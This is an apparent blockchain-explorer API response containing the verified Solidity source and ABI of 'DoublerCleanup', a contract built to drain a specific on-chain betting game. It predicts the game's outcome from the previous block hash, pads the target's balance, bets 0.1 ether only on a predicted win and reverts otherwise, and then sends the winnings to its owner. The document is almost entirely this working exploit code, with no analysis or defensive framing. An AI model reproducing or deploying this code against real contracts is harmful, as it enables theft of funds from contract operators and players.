{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.0;\r\n\r\ninterface TargetInterface {\r\n    function Set_your_game_number(string calldata s) external payable;\r\n}\r\n\r\ncontract DoublerCleanup {\r\n    \r\n    address payable private constant targetAddress = 0x28cC60C7c651F3E81E4B85B7a66366Df0809870f;\r\n\r\n    address payable private owner;\r\n    \r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    \r\n    constructor() public payable {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    function ping(bool _keepBalance) public payable onlyOwner {\r\n        uint targetBalance = targetAddress.balance;\r\n        require(targetBalance > 0.2 ether);\r\n\r\n        uint8 betNum = uint8(blockhash(block.number - 1)[31]) & 0xf;\r\n        require(betNum != 0x0 && betNum != 0xf);\r\n        string memory betString = betNum < 8 ? \"L\" : \"H\";\r\n\r\n        uint256 ourBalanceInitial = address(this).balance;\r\n        \r\n        if (targetBalance < 0.3 ether) {\r\n            uint256 toAdd = 0.3 ether - targetBalance;\r\n            (bool success,) = targetAddress.call.value(toAdd)(\"\");\r\n            require(success);\r\n        }\r\n\r\n        TargetInterface target = TargetInterface(targetAddress);\r\n        target.Set_your_game_number.value(0.1 ether)(betString);\r\n\r\n        require(address(this).balance > ourBalanceInitial);\r\n        \r\n        if (!_keepBalance) {\r\n            owner.transfer(address(this).balance);\r\n        }\r\n    }\r\n    \r\n    function withdraw() public onlyOwner {\r\n        owner.transfer(address(this).balance);\r\n    }    \r\n    \r\n    function kill() public onlyOwner {\r\n        selfdestruct(owner);\r\n    }    \r\n    \r\n    function () external payable {\r\n    }\r\n    \r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_keepBalance\",\"type\":\"bool\"}],\"name\":\"ping\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"DoublerCleanup","CompilerVersion":"v0.5.3+commit.10d17f24","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://73d3f1dfddf3917f152f64c518764fa8ef03bd4e5cc231611e6aac5be0f7ddd5"}]}